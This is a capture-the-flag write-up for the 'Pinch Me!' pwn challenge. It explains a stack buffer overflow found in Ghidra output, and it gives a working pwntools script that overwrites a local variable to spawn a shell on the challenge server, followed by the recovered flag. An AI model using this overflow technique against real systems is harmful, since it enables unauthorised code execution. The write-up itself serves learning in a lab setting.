# Pinch Me! | pwn 100

`This should be easy!`

# Investigation
We're given a binary file, if you run it and enter a string you get "Pinch me!" back.

```
nc dctf1-chall-pinch-me.westeurope.azurecontainer.io 7480
Is this a real life, or is it just a fanta sea?
Am I dreaming?
some input
Pinch me!
```

Decompiling the code in Ghidra, you get

```
void vuln(void)

{
  char local_28 [24];
  int local_10;
  int local_c;

  local_c = 0x1234567;
  local_10 = -0x76543211;
  puts("Is this a real life, or is it just a fanta sea?");
  puts("Am I dreaming?");
  fgets(local_28,100,stdin);
  if (local_10 == 0x1337c0de) {
    system("/bin/sh");
  }
  else {
    if (local_c == 0x1234567) {
      puts("Pinch me!");
    }
    else {
      puts("Pinch me harder!");
    }
  }
  return;
}
```

So `local_10` has to be `0x1337c0de` and we get a shell, but we have no way to write to that

The most interesting thing here is that we have an `fgets` reading 100 bytes, into a variable with only `24`. Surely that'll be an issue.

I know this will cause a buffer overflow, but I've only ever caused `Segmentation Faults` when I did that by accident. How can use them here?


[CTF101](https://ctf101.org/binary-exploitation/buffer-overflow/) explains it very well, the excess from our input over 24 bytes will overflow into `local_10`, so we can use that to rewrite variable values.


# Experiments
I started by padding out some values to see if I could trigger `pinch me harder`.

```
nc dctf1-chall-pinch-me.westeurope.azurecontainer.io 7480
Is this a real life, or is it just a fanta sea?
Am I dreaming?
000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000012345678133
Pinch me harder!
```

Ok, but how do we control that memory more precisely? I tried adding `0x1337c0de` to the end, but no joy. I kept falling into the else condition.


That was when [Cieran](https://github.com/cieran) from the team had just solved another PWN challenge, and was digging around with [PWN tools](https://docs.pwntools.com/en/stable/), a frankly magical python library for exploiting PWN challenges.

We can make our exploit above very easily using
```
from pwn import *

host = remote("dctf1-chall-pinch-me.westeurope.azurecontainer.io", 7480)
host.recv()

buffer_overflow = b'a'*24
buffer_overflow += p64(0x1337c0de)

host.sendline(buffer_overflow)
host.interactive()

```

- `buffer_overflow = b'a'*24` generate a btye string with 24 `a` characters
- `buffer_overflow += p64(0x1337c0de)` [pack](https://docs.pwntools.com/en/stable/util/packing.html) our payload, we want `local_10` to contain `1337c0de`.

Send and we get a shell, so `host.interactive()` allows us to enter commands.

```
$ ls
flag.txt
pinch_me
startService.sh
$ strings flag.txt
dctf{y0u_kn0w_wh4t_15_h4pp3n1ng_b75?}

```
